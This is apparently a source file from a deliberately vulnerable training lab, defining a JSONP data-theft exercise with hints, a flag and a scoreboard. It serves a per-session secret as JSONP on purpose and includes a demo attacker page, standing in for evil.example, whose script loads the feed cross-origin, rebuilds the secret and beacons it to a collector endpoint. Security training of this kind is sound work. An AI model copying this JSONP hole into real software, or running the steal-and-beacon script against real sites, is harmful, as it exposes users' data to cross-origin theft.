'use strict';
// JSONP data theft: GET /jsonp/data serves a per-session secret as JSONP,
// readable cross-origin by any page through a classic script tag (the
// Same-Origin Policy does not apply to classic scripts). The demo page
// GET /jsonp/attacker plays the role of evil.example: it pulls the feed and
// beacons the secret to POST /jsonp/beacon. The beacon only accepts the
// secret this session's feed served, so the feed must actually be loaded.
// NOTE: jsonpSecret lives in modules/jsonp/shared.js (placed by the finisher).
const express = require('express');
const { jsonpSecretShares } = require('../shared');
const { COMBINE_HEX_JS } = require('../../../lib/jstoken');
const { award, captured } = require('../../../lib/flags');
const { brief, esc, page, hintLadder, toolsPill } = require('../../../lib/page');

const router = express.Router();

const vuln = {
  id: 'csrf-data',
  name: 'JSONP Data Theft',
  difficulty: 'Medium',
  hint: 'Classic script tags ignore the Same-Origin Policy. Open the attacker page and watch it steal the feed.',
  hints: ["Proxy your browser through Burp and open /jsonp/attacker. In Proxy history you will see a script tag pull the victim feed cross-origin.", "Open the /jsonp/data response in Proxy: the callback wraps a user's data, and the sensitive value inside it is split into pieces that only code executing the feed can reassemble.", "Shape: a page on one origin loading the feed with a script tag, reading the wrapped data as it executes, and reporting what it found to a collector of its own. The demo attacker page follows exactly that shape; trace its requests in Proxy history from first load to final report."],
  tools: "BZ, B",
  est: 'about 10 to 20 minutes',
  how: 'A JSONP feed wraps sensitive data in a caller-chosen callback, and any website can load it with a script tag: the Same-Origin Policy never gets a say.',
  link: '/jsonp#csrf-data',
  start: 'Browse to /jsonp/attacker through Burp Proxy and watch Proxy history: a script tag pulls the feed cross-origin and the page reports what it read. Follow that request chain from the first load to the final report.',
};

// JSONP feed carrying the victim's data, including the per-session secret.
router.get('/data', (req, res) => {
  const cb = (req.query.callback || 'callback').toString().slice(0, 200);
  res.type('application/javascript');
  // VULN: sensitive data is served as JSONP, readable cross-origin by any
  // page via a script tag. The secret is per-session: the beacon only accepts
  // the secret this session's feed actually served.
  const shares = jsonpSecretShares(req);
  res.send(`${cb}({\"user\":\"alice\",\"email\":\"alice@example.com\",\"sA\":\"${shares.pxa}\",\"sK\":\"${shares.pxk}\"});`);
});

// Attacker page (evil.example): steals the JSONP feed cross-origin and beacons it.
router.get('/attacker', (req, res) => {
  const done = captured(req, 'jsonp', 'csrf-data');
  res.send(page('Attacker page', `
    <h1>Attacker page</h1>
    ${brief('JSONP theft demo', `
      <p>This page plays the role of <code>evil.example</code>. When it loads,
      it pulls the victim's JSONP feed with a plain
      <code>&lt;script&gt;</code> tag (the Same-Origin Policy does not apply to
      classic scripts) and beacons the data to <code>/jsonp/beacon</code>.</p>
    `)}
    <div class="vuln-card">
      <h3>The theft, live</h3>
      <p>This page includes the victim feed exactly the way an attacker's page would:</p>
      <pre><code>${esc('<script src="/jsonp/data?callback=steal"></script>')}</code></pre>
      <p id="status" class="note">Waiting for the JSONP response...</p>
      <script>
        ${COMBINE_HEX_JS}
        function steal(d) {
          document.getElementById('status').textContent =
            'Got data for ' + d.user + '; beaconing it to /jsonp/beacon ...';
          // The feed carries the secret only as two share fields; code that
          // actually runs the feed combines them at runtime.
          var secret = combineHex(d.sA, d.sK);
          fetch('/jsonp/beacon', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ secret: secret })
          }).then(function (r) { return r.json(); }).then(function (j) {
            document.getElementById('status').innerHTML = j.ok
              ? 'Beacon accepted. Flag: <code>' + j.flag + '</code> (saved to your scoreboard)'
              : 'Beacon rejected: ' + (j.error || 'unknown');
          });
        }
      </script>
      <script src="/jsonp/data?callback=steal"></script>
      ${done ? '<p><b>Flag captured.</b> Check your scoreboard.</p>' : ''}
    </div>
    <p class="note">The theft happens automatically when this page loads: the
    victim only has to visit the attacker's link while logged in.</p>
    ${hintLadder(vuln)}
    ${toolsPill(vuln)}
    <p><i>Attack:</i> ${esc(vuln.how)}</p>
    <p><a class="clay-btn clay-btn-secondary" href="/jsonp">Module index</a></p>
  `));
});

// Beacon: accepts the stolen secret and awards the flag. Single-use.
router.post('/beacon', (req, res) => {
  const b = req.body || {};
  // The beacon must carry the secret this session's feed served: proof the
  // feed was actually loaded. Single-use: the secret rotates after the award.
  if (b.secret && req.session.jsonpSecret && b.secret === req.session.jsonpSecret) {
    const flag = award(req, 'jsonp', 'csrf-data');
    delete req.session.jsonpSecret;
    return res.json({ ok: true, flag });
  }
  res.status(400).json({ ok: false, error: 'beacon must carry the stolen secret field' });
});

module.exports = { vuln, router };
